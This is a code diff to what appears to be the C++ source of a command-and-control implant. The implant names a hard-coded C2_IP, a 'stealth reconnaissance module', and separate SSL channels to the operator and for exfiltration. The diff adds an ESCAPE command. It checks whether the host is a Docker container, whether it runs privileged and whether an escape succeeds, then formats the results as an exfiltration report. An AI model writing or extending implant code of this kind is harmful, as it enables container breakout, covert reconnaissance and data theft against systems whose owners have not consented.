@@ -19,6 +19,7 @@
 
 // Full stealth reconnaissance module
 #include "recon.h"
+#include "docker_enum.h"
 
 #ifndef C2_IP
 #define C2_IP "10.37.1.249"
@@ -110,6 +111,18 @@ void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
             c2_response = recon_report;
         }
         exfil_data = "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n";
+    } else if (keyword == "ESCAPE") {
+        DetectionResult result = run_environment_checks();
+        c2_response = result.can_escape ? "ESCAPE_OK " + id : (result.is_docker ? "ESCAPE_FAIL " + id : "NOT_DOCKER " + id);
+        
+        std::ostringstream oss;
+        oss << "=== CONTAINER ESCAPE REPORT ===\n";
+        oss << "Is Docker: " << (result.is_docker ? "YES" : "NO") << "\n";
+        oss << "Privileged: " << (result.is_privileged ? "YES" : "NO") << "\n";
+        oss << "Escape Status: " << (result.can_escape ? "SUCCESS" : "FAILED/NA") << "\n";
+        oss << "Details: " << result.details << "\n";
+        oss << "=== END ===\n";
+        exfil_data = oss.str();
     } else {
         c2_response = "ERR " + id;
     }
